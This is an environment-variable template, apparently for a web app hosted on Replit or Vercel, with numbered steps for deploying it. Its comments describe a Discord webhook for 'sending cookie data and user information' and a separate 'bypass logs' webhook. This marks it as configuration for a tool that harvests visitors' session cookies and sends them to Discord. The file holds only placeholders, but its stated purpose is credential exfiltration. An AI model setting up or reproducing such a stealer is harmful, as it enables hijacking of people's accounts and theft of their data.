# Discord Webhook Configuration
# Main webhook URL for sending cookie data and user information
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/YOUR_MAIN_WEBHOOK_ID/YOUR_MAIN_WEBHOOK_TOKEN

# Bypass logs webhook URL for sending clean data without cookies
BYPASS_WEBHOOK_URL=https://discord.com/api/webhooks/YOUR_BYPASS_WEBHOOK_ID/YOUR_BYPASS_WEBHOOK_TOKEN

# Database Configuration (handled by Replit/Vercel)
DATABASE_URL=postgresql://username:password@host:port/database

# Session Secret (auto-generated by Replit/Vercel)
SESSION_SECRET=your_session_secret_here

# Instructions:
# 1. Copy this file to .env and replace placeholder values with actual webhook URLs
# 2. For Vercel deployment, set these as environment variables in your Vercel dashboard
# 3. Go to your Vercel project settings → Environment Variables
# 4. Add each variable name and value separately
# 5. Make sure to redeploy after adding environment variables